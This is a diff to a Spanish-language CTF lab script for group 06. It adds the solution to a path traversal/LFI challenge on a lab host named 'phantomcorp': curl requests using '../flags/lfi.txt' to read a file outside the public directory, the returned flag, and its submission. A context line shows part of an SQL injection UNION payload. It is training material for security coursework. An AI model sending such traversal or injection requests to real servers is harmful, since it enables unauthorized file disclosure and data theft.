@@ -9,3 +9,30 @@ curl -sS -i -G http://phantomcorp/buscar --data-urlencode "q=Router' UNION SELEC
 
 # Pendiente de registrar en una instalación Unix/WSL con finales de línea LF:
 # ./ctf submit 07 R2 'FLAG{sqli_union_dump}'
+
+# ==========================================
+# R4 — Path Traversal / LFI
+# Responsable: Tomás Giudici
+# ==========================================
+
+# Entorno: contenedor atacante (cyberlab-attacker)
+# Línea base: solicitud de un archivo público
+curl -sS -i -G http://phantomcorp/descargar --data-urlencode "archivo=catalogo.txt" | tee /loot/r4-traversal-base.txt
+
+# Prueba de Path Traversal
+# Se utiliza ../ para salir del directorio public/
+curl -sS -i -G http://phantomcorp/descargar --data-urlencode "archivo=../flags/lfi.txt" | tee /loot/r4-traversal.txt
+
+# Resultado observado:
+# HTTP/1.0 200 OK
+# FLAG{path_traversal_lfi}
+
+# Entorno: Git Bash, desde la raíz del repositorio
+# Registrar la flag en el motor del laboratorio
+./ctf submit 07 R4 'FLAG{path_traversal_lfi}'
+
+# Resultado: Reto R4 resuelto correctamente.
+
+# Copiar evidencias al directorio de entrega
+mkdir -p entregas/lab07/grupo06/evidencia/salidas
+cp .loot/r4-traversal-base.txt .loot/r4-traversal.txt entregas/lab07/grupo06/evidencia/salidas/
